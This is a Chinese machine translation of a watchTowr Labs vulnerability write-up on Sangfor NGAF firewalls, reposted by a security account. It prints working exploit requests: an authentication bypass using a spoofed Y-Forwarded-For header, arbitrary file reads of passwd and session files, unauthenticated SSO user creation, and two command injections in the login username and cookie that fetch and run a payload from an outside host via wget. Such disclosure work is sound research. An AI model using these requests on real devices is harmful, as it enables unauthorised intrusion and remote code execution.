# 国外赏金猎人手撕SXF下一代防火墙 RCE 过程
**免责声明：** 由于传播、利用本公众号李白你好所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号李白你好及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

本文来源于国外博客，由谷歌机翻阅读起来可能会有别扭，英文好的朋友们可点击文末原文链接自行浏览。

**1**►

**前言**

深信服（或深信服科技）是一家“中国网络设备制造商，包括广域网优化、下一代防火墙和SSL VPN，其产品主要销售给中型企业”。

深信服将自己描述为“有效的网络安全和高效的企业云解决方案”的正确场所。我们知道这一点（除了‘因为他们在网站上这么说’），因为“在深信服，我们坚信只为客户提供最好的 IT 架构和安全解决方案”。

以下是深信服关于 NGAF 的一些介绍：

“深信服NGAF是全球首个支持人工智能且完全集成的NGFW（下一代防火墙）+WAF（Web应用防火墙），通过Neural-X和Engine Zero等创新技术提供全方位的保护，抵御所有威胁。它是一个真正安全、集成和简化的防火墙解决方案，提供整个组织安全网络的整体概览，并且易于管理、操作和维护。”

在您与我们一起踏上这段旅程之前，我们想明确说明 \- 深信服已经告诉我们这篇博文中的所有漏洞要么是a) 已经修复，要么 b) 误报。我们并不是声称存在 0day。因此，我们很高兴分享我们对旧漏洞的分析，以及我们（深信服）认为是有意设计的行为，最终很高兴我们不需要应用我们的 90 天披露政策。

好奇的人可能会说“警告客户这些已经存在和修补的漏洞的公共建议在哪里？”。好奇的人可能还会问，这些漏洞最初是如何进入生产、安全设备的？幸运的是，我们不好奇，也很高兴不去质疑这些平凡的事情。

无论如何，我们离题了。正如我们博客文章的痴迷读者所知道的那样，我们经常针对我们在与之合作的组织的攻击面中看到的企业技术。

痴迷的读者也会熟悉我们对安全防火墙和 VPN 设备的深深痴迷 - 我们没有丰富的想象力，我们只是想要我们进入网络的入口点。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/767184c8-8900-4b9e-9c08-df002752609c.png?raw=true)

**2**►

**寻找目标**

在之前的博客文章中，我们非常详细地展示了破坏应用程序所采取的广泛步骤 \- 提取 HTTP 路由、搜索参数，以及我们如何将部分功能限定为目标软件中的“感兴趣”。重新打破。然而，在这一切发生之前，必须做出一个决定——目标是否令人感兴趣，是否值得投入时间？

这种类型的决策可能会受到各种因素的影响，例如代码复杂性、现实世界的影响、安全透明度（哈哈），在这种特殊情况下，“黑客第六感”——它是否泄露了以下信息：潜在的薄弱软件？

深信服的 NGAF 作为潜在的研究目标引起了我们的关注，主要是因为其缺乏 CVE 披露。这通常表明要么安全社区尚未窃取其代码，所涉及的设备确实是安全的，要么是更可能的答案 - 充斥着保密协议和类似类型协议的错误赏金计划使安全过程变得神秘！

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/a52dff4f-2eb7-475e-9205-9d1d6b42b198.png?raw=true)

在进入代码和工作流程的肮脏深处之前，我们可以使用各种提示和技巧来从鸟瞰角度计算成功的“赔率”。这些“赔率”将帮助我们决定发现错误的可能性有多大，从而决定我们应该花费多少时间和精力来审核目标。

让许多评论家沮丧的是，我们在代码库中看到的第一个“迹象”是这个所谓的“下一代”设备混合使用了 PHP 和 C++ CGI 二进制文件。我们之前已经看到自定义 PHP 应用程序如何导致安全问题，您只需看看我们最近对瞻博网络防火墙的深入研究即可作为示例 - 但不要相信我们的话，即使是深信服的开发人员也有不好的看法PHP 的观点，我们完全同意。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/8f0ca747-9e45-4200-950d-971dc7c6e1a7.png?raw=true)

同样有趣的是，包含此类脏话的代码库本身就是一种“告诉”——在我们看来，开发人员要么不打算让公众查看这些代码，要么只是不在乎看起来不专业。

显然，我们的“底池赔率”看起来相当不错。

**3**►

**当服务器变成客户端时**

除了在应用程序的代码库中寻找脏话和评论之外，我们首先只是给设备提供众所周知的轮胎踢。

当我们对设备有所了解时，我们开始探索有趣的行为，这些行为可能会揭示解决方案的技术堆栈和架构的内部工作原理。

很快，我们就偶然发现了一个“信号”，要求大幅提高对深信服 NGAF 的押注。

当向目标服务器的 PHP 文件发出请求时，如果标头中存在非数字值Content-Length，服务器将响应 HTTP 状态 413（“内容太大”）。这并不奇怪，但是，不同寻常的是服务器端源代码（PHP）被转储到响应中（??）：

```nginx
curl --insecure  https://<host>:85/index.php -H "content-Length:asdf"
```

```http
HTTP/1.1 413 Request Entity Too Large
Date: Tue, 03 Oct 2023 10:08:06 GMT
Server:       
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>413 Request Entity Too Large</title>
</head><body>
<h1>Request Entity Too Large</h1>
The requested resource<br />/index.php<br />
does not allow request data with GET requests, or the amount of data provided in
the request exceeds the capacity limit.
</body></html>
<?php 
/*
 * @Func:  ææçè¯·æ±é½ç¨apacheæå¡å¨mod_rewriteæ¨¡åæ¹åURLè§åï¼éæ°å®åå°è¿ä¸ªphpæä»¶
 */
session_start();

//ç»ä¸ä½¿ç¨webappsä½ä¸ºæ ¹ç®å½å®ä½å¶å®æä»¶
require_once("../class/common/conf/config_inc.php");
if(SANGFOR_LANGUAGE == 'en.UTF-8') {
  require_once("../conf/lang/eng.utf8.lang.app.php");
}

else {
  require_once("../conf/lang/chs.utf8.lang.app.php");
}

//å¤æ­æ¯å¦å­å¨ç¡¬ç
if(@file_exists("/etc/sinfor/log/diskerror.log")) {
  header("Content-Type:text/html; charset=utf-8");
  echo LOG_DISK_ERROR;
  exit(0);
}

//å¯¹äºé«ç«¯æ¯çè®¾å¤ssd+hddå¤æ­hddæ¯å¦å¼å¸¸
if(@file_exists("/etc/sinfor/log/adv_diskerror.log")) {
  header("Content-Type:text/html; charset=utf-8");
  echo LOG_DISK_ERROR;
  exit(0);
}

require_once(CLASS_COMMON_PATH."dispatch/CFrontController.php");

$t_objFrontController = new CFrontController();
$t_objFrontController->dispatchRequest();
?>
```

几个小时后，在认真盯着屏幕后，我们做出了一个决定：这可能不是有意的（深信服不同意）。

根据有根据的猜测，我们最有可能看到的是 CGI 处理程序中某处发生的整数处理问题。不幸的是，在这种类型的漏洞原语中对于升级访问很有用的典型敏感文件（config.php 等）却没有。

虽然上述行为很有趣，但我们发现自己对所达到的混乱程度并不满意 \- 但确实觉得我们已经向自己证明了该设备可能符合“有趣”的标准。因此，是时候深入挖掘了。

**4**►

**技术细节**

对于在家跟随的朋友，我们快速枚举了使用以下命令公开的服务：lsof -nP -i | grep LISTEN  来自 NGAF 上的本地 shell。作为一个总结，我们能够看到我们有两个打开的 HTTPS 服务，正在监听 0.0.0.0；

端口 85/TCP，运行“防火墙报告中心”，并且，

端口 4433/TCP，运行“管理员登录门户”。

很自然地，我们潜入了港口85/TCP。

映射到此服务的入口点 \- 在位于 的 Apache 配置中定义/etc/apache/conf.new/original/httpd.conf。

当想要了解设备暴露的隐喻攻击面时，特别是在 Apache Web 服务器配置文件中，我们会寻找Location、ScriptAlias和Alias指令。这样做通常会为我们提供一个很好的端点和公开目录列表，事实上，在这种安全、强化的人工智能驱动的深信服设备的情况下，所呈现的结果包括丰富的可能性列表：

```nginx
Alias /icons/ "/virus/apache/apache/icons/"
Alias /bbc "/virus/webui/ext/fast_deploy.html"
Alias /manual/ "/virus/apache/apache/htdocs/manual/"
Alias /cgi-bin/ "/virus/webui/cgi-bin/"
Alias /svpn_html/ "/virus/webui/svpn_html/"
Alias /proxy.html "/virus/webui/ext/login.php"
Alias /proxy_cssp.html "/virus/webui/ext/login.php"
```

但是，尝试访问这些项目中的任何一项都会导致重定向到“authenticate - at” LogInOut.php。

不过，我们对身份验证后的错误并不感兴趣——我们只对预先身份验证的漏洞有更高的要求。是时候再次查看 Apache 配置了。

对该配置的进一步分析揭示了一条RewriteRule规则，它将所有请求重写为index.php，其中包含几个require，更重要的是 - 对控制器类的调用。

```php
require_once(CLASS_COMMON_PATH."dispatch/CFrontController.php");

$t_objFrontController = new CFrontController();
$t_objFrontController->dispatchRequest();
```

这个控制器类负责处理我们的应用程序级路由。它全部映射在 中CFrontController.php，我们可以在其中看到端点以及与每个端点关联的相应控制器函数：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/d4cc9904-2e6c-4f57-92b9-7bbee0996769.png?raw=true)

如果没有首先进行身份验证，则无法通过 Web 界面直接访问这些内容，因此是时候查看调用这些内容的函数了。这就是dispatchRequest()功能。

在查看此内容的几秒钟内，我们看到了下一个兴趣点 \- 该函数倾向于在转发请求之前检查身份验证。

我们可以看到一个IF条件，该条件根据 (localhost) 的值检查$_SERVER\['

```
REMOTE_ADDR']（即客户端
```

的 IP 地址）127.0.0.1，如果匹配，则将布尔值  $t_boolNeedCheck设置为false，并绕过其余的重定向逻辑。

最好的条件身份验证。

```php
public function dispatchRequest()
{
    $t_objController = $this->getControllerInstance();
    if($t_objController) {
      //是否需要判断跨站攻击，一般登录页面不需要判断跨站攻击
      if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1')
        $t_boolNeedCheck = false;
      else
        $t_boolNeedCheck = true;
      if(isset($t_objController->m_boolNeedCheck))
        $t_boolNeedCheck = $t_objController->m_boolNeedCheck;
      //防止跨站攻击
      if($this->isAuthUser() && strcmp($_SERVER['REMOTE_ADDR'],"127.0.0.2") != 0 && !isset($_REQUEST['scinfo']) && !isset($_REQUEST['sd_t']) && (!isset($_GET['sid']) || $_GET['sid'] != session_id()) && $t_boolNeedCheck)
      {
        //要设置t_boolNeedCheck = false，要不会有重定向死循环
        CMiscFunc::locationHref('/Redirect.php?url=/LogInOut.php');
        exit(0);
      }
      $t_fStartTime = $this->costMicroTime();
      $t_strResult = $t_objController->action($this->m_objConf, $this->m_arrReturn);
      $t_fEndTime = $this->costMicroTime();
      $t_fTotal = $t_fEndTime - $t_fStartTime;

      CMiscFunc::printMsg($t_fTotal);
      return true;
    }
    CMiscFunc::locationHref('/Redirect.php?url=/LogInOut.php');
    return false;
  }
```

作为外部攻击者，我们是否可以控制 PHP 看到的 IP 地址，或者是否有机会利用 SSRF 类型的漏洞来绕过这个强大的安全控制？

嗯，在现实世界中，有一些标头可能会促进这一点 \- 例如X-Forwarded-ForHTTPX-Real-Ip请求标头，但实验证明这些标头没有效果。

再次回到 ，httpd.conf我们可以看到一个不寻常但可疑的指令 - RPAFheader Y-Forwarded-For。该指令从模块加载mod_rpaf，允许客户端设置其“远程”IP 地址……很有用。我们心里想，这可能是预期的功能。

对涉及的请求的快速测试Y-Forwarded-For: 127.0.0.1  表明，在发出未经身份验证的请求时，我们不再被重定向到登录页面。

沙赞！我们潜在漏洞链的第一阶段受到攻击，因为这为我们打开了应用程序攻击面的“全新世界”——所有别名都在 Apache 配置中定义。

例如，以前无法访问的内容/vmp_getinfo变得触手可及：

```nginx
curl --insecure  https://<host>:85/vmp_getinfo -H "Y-Forwarded-For: 127.0.0.1"
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/458d5e1a-c0ab-41df-9d14-9d129a8caabb.png?raw=true)
  

**这是事后的想法，但我们花了一些时间思考此设置的实际目的，因为它没有在代码中的任何地方使用。也许它是在测试期间使用的，或者是从后来的版本中删除了一些最初的目的？我们会把这个想法留给你们自己，但你们知道，计算机和代码并不是魔法。** 

**5**►

**继续分析**

有了有趣的行为，是时候出发看看我们接下来要去哪里了？

回到 Apache 配置文件，有一个有趣的Alias指令集 -/svpn\_html/ "/virus/webui/svpn\_html/”它提供了一组更大的应用程序代码和功能。

loadfile.php引起了我们的注意，它接受单个参数file，解析它的路径，读取内容，然后写入响应。对于任意文件读取来说，看起来很容易获胜：

```xml
<?php
function get_basename($filename){
    return preg_replace('/^.+[\\\\\\\\\\\\/]/', '', $filename);
}
$file = addslashes($_GET['file']);

echo $file;
//add by 1w
$file_path = pathinfo($file);

$extname = $file_path ['extension'];
$filename = "";

if (!file_exists($file)) {
    die("File Not found");
}
$filename = get_basename($file);

$ua = $_SERVER["HTTP_USER_AGENT"];
header('Content-type: application/octet-stream');
if (preg_match("/Firefox/", $ua)) {
    header('Content-Disposition: attachment; filename*="utf8\\'\\'' . $filename . '"');
} else {
    header('Content-Disposition: attachment; filename="' . urlencode($filename) . '"');
}
readfile($file);

if($needDelete) {
    @unlink($file);
}
?>
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/d1cdf963-f358-4611-861e-9e83767e737a.png?raw=true)

```nginx
curl --insecure  https://<host>:85/svpn_html/loadfile.php?file=/etc/./passwd -H "y-forwarded-for: 127.0.0.1"
```

卡波！进步是好的。

**只是提醒一下，这是“世界上第一个支持人工智能且完全集成的 NGFW（下一代防火墙）+ WAF（Web 应用程序防火墙），通过 Neural-X 和 Engine Zero 等创新技术提供全方位的保护，抵御所有威胁”。** 

虽然它总是一个令人惊叹的屏幕截图，但/etc/passwd我们想看看它能为我们的读者朋友带来的最大影响是什么。由于没有找到明文凭证，我们确实发现了许多显示 live 的文件PHPSESSID，因此我们可以劫持会话，有很多文件可供您选择：

```
`/etc/sinfor/DcUserCookie.conf``/etc/en/sinfor/DcUserCookie.conf``/config/etc/sinfor/DcUserCookie.conf``/config/etc/en/sinfor/DcUserCookie.conf`
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/a1615e89-288d-417c-b6c1-0b87afab604a.png?raw=true)

如果您仍在寻找以实时管理员身份获得访问权限的更简单方法，您可以直接查看 Apache 访问日志并查看通过请求传递的 cookie GET。错误分类器将因这一“低”发现而陷入混乱，但作为管理员，我们感到不寒而栗。

```
/virus/apache/apache/logs/access_log
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/216669b7-8ae2-4dd8-be46-88ac129adc08.png?raw=true)

编者注：此时我们感觉自己就像某些国家的非官方系统管理员（我希望有人能得到参考）。

**6**►

**漏洞分析**

就在这个时候，我们不得不停下来暂停一下。“下一代”应用程序防火墙怎么可能存在如此容易出现的漏洞？这是否真的如此具有创新性和下一代性，以至于我们看到了新事物？

好吧，现在我们很高兴接受它 \- 我们找到未经授权的远程命令执行的圣杯的机会刚刚增加，现在是时候全力以赴了。

进一步查看混乱的 PHP 文件，下一个引起我们注意的文件是HttpHandler.php，它提供了类似 AJAX 的功能。它需要两个请求参数controler和action，并使用它们来调用指定的控制器类和公共函数：

```php
public function process()
{
    try
    {
        $controller=$_REQUEST["controler"];
        $action=$_REQUEST["action"];

        $this->validPara($controller, 'AjaxReq_NoConctroler');
        $this->validPara($action, 'AjaxReq_NoAction');
        $controller = $controller."Controller";

        //反射controller类信息
        $classInfo = new ReflectionClass($controller);

        //创建controller类实例
        $instance=$classInfo->newInstance();

        //反射得到action方法
        $methodInfo = $classInfo->getMethod($action);

        //反射得到action参数表
        $parainfos=$methodInfo->getParameters();
        $paras=array();
```

例如，如果设备已连接域，我们可以通过以下方式检索配置数据/svpn_html/delegatemodule/HttpHandler.php?controler=ExtAuth&action=GetDomainConf&id=3

```sql
HTTP/1.1 200 OK
Date: Wed, 13 Sep 2023 08:47:12 GMT
Server:

X-Frame-Options: SAMEORIGIN
Set-Cookie: PHPSESSID=k0bo7srcg6kbsotog2qnrhpns2; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: private, proxy-revalidate no-transform
Pragma: private, proxy-revalidate, no-transform
Vary: Accept-Encoding,User-Agent
Content-Length: 303
Connection: close
Content-Type: text/html

{"code":0,"success":true,"result":{"devName":"**<redacted>**","svrDomainName":"","logSvrDomain":"","domainComputer":"","srvDomainAddr":"","domainUserName":"","domainUserPwd":"","enableDomain":0,"eanbleDomainAuth":0},"message":"Operation success","readOnlyInfo":{"enable_ids":"","disable_ids":"","readonly":1}}
```

总共有 20 个控制器和一百多个功能需要审核。不过，对我们来说不幸的是，大多数似乎具有有趣行为的公共功能也会检查“正确”（即除了“源 IP”之外）身份验证，并且我们再次重定向到登录页面（没有绕过）这次）。

我们确实发现了一个缺乏身份验证检查的“写入”功能，允许我们写入 SQLite 数据库并为 SSL VPN 创建新的 SSO 用户。至于其影响，我们将留给您想象。

有趣的是，它也容易受到 SQL 注入的攻击，但由于底层 DBMS 是 SQLite，因此这对于 RCE 来说作用有限。

```http
POST /svpn_html/delegatemodule/HttpHandler.php HTTP/1.1
Host: 
Y-Forwarded-For: 127.0.0.1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

controler=User&action=SetUserSSOInfo&userid=watchTowr&rcids=0&ssouser=watchTowr&ssopwd=watchTowr
```

在花费了大量时间审核设备后，我们得到了：

*   身份验证绕过
    
*   源代码披露
    
*   本地文件读取
    
*   能够添加我们自己的 SSO 用户
    
*   能够转储 Active Directory 配置信息，包括用户名和密码。
    

但是，我们却不知所措。远程命令执行会逃避我们吗？这个设备真的安全吗？

**7**►

**分析**

在此过程中的这一点上，是时候重新评估我们明显失败的方法了。我们需要更多的透明度来理解与系统交互的代码。

对于大多数此类应用程序，主要的注入类型是命令和 SQL。也许我们可以通过在数据库配置中启用跟踪日志或通过grep“ping 所有发生的操作系统命令”来增强这些区域的可见性？

浏览各个类我们可以看到开发人员喜欢使用shell_exec,exec和来执行 shell 命令popen。该代码有点难以追踪，因此我们过去常常  pspy提供帮助。

Pspy 是一个有用的小工具，CTF 团队经常使用，它将位于后台并记录所有正在生成的进程及其参数 - 非常适合发现命令注入，我们怀疑这将是实现 RCE 的最快途径。

将二进制文件与 grep 命令一起放置pspy在目标框中，可以查看 Apache 进程生成的内容：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/171b42bc-dc34-4f3c-a253-6f1b64db606c.png?raw=true)

再次运行所有控制器和功能后，我们仍然无法找到任何明确的注入点。此时，在耗尽此服务的代码库后，我们决定休息一下并放弃（哈哈）。

这是一个幸运的好例子——在正常进行身份验证时，一些神圣的力量触碰了我们的手指，我们不小心输入了错误的用户名。我们还有pspy观察的过程，看到这里我们都瞪大了眼睛：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/55c27ece-0016-4dc3-8642-ea6a8607f5f2.png?raw=true)

正如您在上面的捕获中看到的pspy，用户名Admi被直接传递到 shell 命令中......是否可以将我们自己的命令注入到登录页面上的用户名参数中？

当然，这不太可能……普通的扫描仪、渗透测试仪或赏金猎人肯定会发现它吗？干得好验证码。

通过查看该文件，CFWLogInOutDAO.php我们可以找到remoteLogin()负责此操作的函数：

```php
public function remoteLogin(&$in_arrSearchCondition)
{
    $userName = $in_arrSearchCondition ['user_name'];
    $passwd = $in_arrSearchCondition ['password'];
        //rsa的解密
    $t_strMD5 = $this->decrypt($passwd);    
    $fp = popen("/usr/sbin/remoteLogin remoteLogin $userName $t_strMD5", "r");
    $retResult = fread($fp, 20);
    pclose($fp);
    if ($retResult == "retLoginSuccess") {
      $in_arrSearchCondition ['user_name'] = $userName."_remote_";
      $t_strUserName = addslashes($in_arrSearchCondition ['user_name']);
      $t_strSQL = "SELECT * FROM FW_AUTH_dcuser.UserAuthInfo WHERE user_name = '$t_strUserName' AND status = 1 LIMIT 1";
      return $this->setSession($t_strSQL);
    }
    return false;
  }
```

讽刺的是，开发人员addslashes()在 SQL 语句中处理之前调用用户名，但在函数中使用它之前没有进行任何清理popen()。哎呀！

经过一段时间的研究，我们意识到不可能在用户名中注入任何旧的特殊字符，  因为||由于. 但是，我们注意到它可能会用分号截断命令。&&mod_security

作为关注者，我们想要神奇的输出来显示从单个 HTTP 请求到响应的命令执行情况 - 因此，我们必须发挥创造力。响应详细说明了文件中声明的静态错误消息/virus/dcweb/conf/lang/eng.utf8.lang.app.php。

我们的新目标是编写一个输出到此错误消息的命令。通常（我们喜欢这个词），您会使用某种编码来绕过‘ “和mod_security限制，但base64和xxd在设备上不可用。为了避免这种情况，我们采取了以下方法来赢得胜利：

1、将有效负载托管在外部 HTTP 服务器上

2、使用获取有效负载wget

3、通过执行有效负载source- 我们认为它比.

4、sed将错误消息替换为以下值$(id)

我们剩下的是这张很棒的屏幕截图，将胜利全部显示在一个地方：

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/e0e1f70c-52ef-4ecc-a612-72991408d9c4.png?raw=true)

请求包：  

```makefile
POST /LogInOut.php HTTP/1.1
Host:
Cookie: PHPSESSID=2e01d2ji93utnsb5abrcm780c2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close
Content-Length: 625

type=logged&un=watchTowr;wget http://<host>/cmd.txt;source /virus/dcweb/webapps/cmd.txt&up=0f2df0a6f151e836c8ccd1c2ea3bfbdfb7bfa0d38d438942492bd8f28f3e92939319f932f2f2add6d0d484accdc4c28269b203c4dc77c1da941fa19dae017d44d6ea8cad2572e37c485a8ebcb4bdb510cc86420a50ae45ae07daf5fe9c40fe133f3806cd8f3158ee359766e8e19c9fbbf7e888bf0d7f3952f4d083bd17cd19eb960dadec2835f6f259616f5b2e5942d3a4d1754cbd69696fae60ef18358bf5782dd5ebf377f5642e0583e630660ccac241a615ae21bfc12852a32d0367a899eb010e5d1c33669fc2e9ea3a0ecbf078c22120196a115b4038288063bf99610d3d331acb53e5c8fbd14229a4abdff83cf075a7b97a9bb9dae3586f19256f4262d5&vericode=<correct captcha>
```

Cmd.txt 有效负载：sed -i s/Lock/"$(id)"/g /virus/dcweb/conf/lang/eng.utf8.lang.app.php

响应包：

```sql
HTTP/1.1 200 OK
Date: Thu, 05 Oct 2023 07:46:53 GMT
Server:       
X-Frame-Options: SAMEORIGIN
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: private, proxy-revalidate, no-transform
Pragma: private, proxy-revalidate, no-transform
Vary: Accept-Encoding,User-Agent
Content-Length: 139
Connection: close
Content-Type: text/html

Error: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) is triggered by too many login failures. Please try again 5 minute later!
```

虽然找到 RCE 是每个研究人员的梦想，但发现这样一个简单的 bug 等待发现也是相当令人沮丧的。人们会认为，实现 RCE 需要一连串 2 或 3 个漏洞，使用授权绕过、PHP 对象注入和各种其他的胡言乱语。

您可以想象在该设备中实现大型 RCE 是多么容易，这是多么令人失望。

**只是提醒一下，这是“世界上第一个支持人工智能且完全集成的 NGFW（下一代防火墙）+ WAF（Web 应用程序防火墙），通过 Neural-X 和 Engine Zero 等创新技术提供全方位的保护，抵御所有威胁”。** 

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/9ccd8d63-47f8-41b9-9e40-45fae3d6f5c2.png?raw=true)

我们决定给该设备第二次机会 \- 也许一些野外设备已对端口 85/TCP 进行了防火墙保护，而仅开放了 4433/TCP。这将使我们有机会炮制更复杂的攻击路径，并获得更多关注/互联网点。

端口 4433 上的攻击面略有不同，因为本机流通过 C++ CGI 文件而不是 PHP 进行身份验证。我们曾考虑过用晚上的时间在 Ghidra 上分析它，但我们的脑海中突然闪现出一个想法：也许设计端口 85/TCP 上的登录 PHP 脚本的开发人员也开发了 CGI 模块，也许……只是也许…… 。

受到这个想法的启发，我们尝试在仍在运行的情况下登录流程pspy。使用相同的原理，我们尝试使用不正确的用户名登录……你瞧，另一个 shell 命令以稍微不同的格式执行。很明显，CookiePHPSESSIONID是在临时文件的 echo 命令中使用的。

```http
POST /cgi-bin/login.cgi HTTP/1.1
Host: 
Cookie: PHPSESSID=2e01d2ji93utnsb5abrcm780c2
Content-Type: Application/X-www-Form
Connection: close
Content-Length: 113

 {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "Y92N" , "privacy_enable": "0"}}
```

Pspy捕获：  

```typescript
CMD: UID=65534 PID=31595  | sh -c echo loginmain.cpp is_vericode_vaild 1982 get the file : /tmp/sess_2e01d2ji93utnsb5abrcm780c2 context is failed errno : No such file or directory >> /tmp/login.log
```

由于该值是从 cookie 中获取的，因此我们无法注入分号来截断命令（或对它们进行 URL 编码）。相反，通过使用反引号（这次是允许的），我们可以创建自己的变量并评估括号内的内容。不幸的是，这里没有sed可用的漂亮输出，因此您必须解决超出范围的请求🙂

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/eb1a0b3f-bf41-4cdc-9dc2-9116245153c2.png?raw=true)

```http
POST /cgi-bin/login.cgi HTTP/1.1
Host: 
Cookie: PHPSESSID=`$(wget host)`;
Content-Type: Application/X-www-Form
Connection: close

 {"opr":"login", "data":{"user": "watchTowr" , "pwd": "watchTowr" , "vericode": "EINW" , "privacy_enable": "0"}}
```

哎哟。再次RCE。

**只是提醒一下，这是“世界上第一个支持人工智能且完全集成的 NGFW（下一代防火墙）+ WAF（Web 应用程序防火墙），通过 Neural-X 和 Engine Zero 等创新技术提供全方位的保护，抵御所有威胁”。** 

**8**►

**SXF总是赢得**

在赌桌上积累了我们的漏洞筹码后，我们联系了深信服的技术团队，准备套现。

经过几封令人兴奋的来回电子邮件后，我们从未直接与安全团队交谈 \- 而是通过技术支持与安全团队交谈。

深信服团队声称要么完全意识到这些问题，并且已经分发了补丁，要么无法验证我们的发现，理由是“误报”。或许是被旁边的玩家骗了，最后落得N天未公开的下场。

不管怎样，这很有趣。我们会让您在自己的头脑中得出结论，什么可能已经发生，什么可能没有发生。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/ae0e1e55-1ddc-4709-b212-03f3fcd8c7f0.png?raw=true)
  

**9**►

**结论**

当赏金猎人、研究人员或渗透测试人员等查看攻击面是否存在漏洞时，通常会得出一个不言而喻的假设：防火墙和 VPN 等设备已得到强化，这通常是由于内部安全审查流程以及跨多个企业外部流程与其他个人的竞争。

编者注：我猜他们说的是“安全”和“安全”。

不言而喻，上述唾手可得的成果在公元 2023 年应该不存在，我们希望这一年发现真正的、有影响力的漏洞所需的投资大幅增加。我们希望这篇文章能够改变这种心态——即使是入门级的攻击安全实验室课程也与像这样的广泛使用的“下一代”产品非常相关。

现在，普通读者会清楚地意识到我们喜欢在 watchTowr 上挑选这种“坚固”的设备。事实上，对于这样的错误，很难不感兴趣 - 我们鼓励每个有兴趣寻找错误的人拿起他们最近的“下一代”或“企业级”防火墙或 VPN 端点，并开始将其撕成碎片。

对于网络防御者来说，真正的教训是，我们不能假设这些强化设备根本就已经强化。无论销售人员可能告诉您什么，没有什么比网络分段和最小特权原则更好的了。

文章作者：SONNY  

文章来源：https://labs.watchtowr.com/yet-more-unauth-remote-command-execution-vulns-in-firewalls-sangfor-edition/

**10**►

**关注我们**

[

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/8eaf7d65-79ef-424c-b7fe-6842ad1459e1.jpeg?raw=true)

攻防实战-外网突破姿势合集







](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247501123&idx=1&sn=03d1b6d1cfb94800e668b13b2ad10cc6&chksm=c09ab613f7ed3f05b5b0d65613fcc7bc60c021c753fc42d438f5b0d1d78c27c691260fcc3c04&scene=21#wechat_redirect)

[

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/1817f0fe-3cf6-4b81-b419-3662a7a03cf6.jpeg?raw=true)

Burp插件，自动化挖掘SSRF，Redirect，Sqli漏洞







](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247501051&idx=1&sn=98790726ccd3cdfcd4640f3ef1aa0505&chksm=c09ab7abf7ed3ebdfa244977dfbf725e16f62c60e135bdc43df47213f301736808936e8f369a&scene=21#wechat_redirect)

[

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/e63b0515-3b78-4d79-b1aa-077091db39fa.jpeg?raw=true)

Linux下内网渗透FRP代理和Viper代理对比







](http://mp.weixin.qq.com/s?__biz=MzkwMzMwODg2Mw==&mid=2247501047&idx=1&sn=33b642c50c5f7a31e1c6256cce05ffe9&chksm=c09ab7a7f7ed3eb17b3928394fbb17b06dabf0e9650c472933faea348cea36eb2df256da1204&scene=21#wechat_redirect)

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/c25be5ec-25fc-466e-b6a8-3a761bcc9d59.gif?raw=true)

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/f3f39437-d522-4876-bbf2-3ff730a76a58.gif?raw=true)

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/cf26bf7a-b4a6-4a31-ba5a-425d067f3294.gif?raw=true)

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/10/2fa2e0df-22d7-4ee4-86a7-a5f0a1dda3dc.gif?raw=true)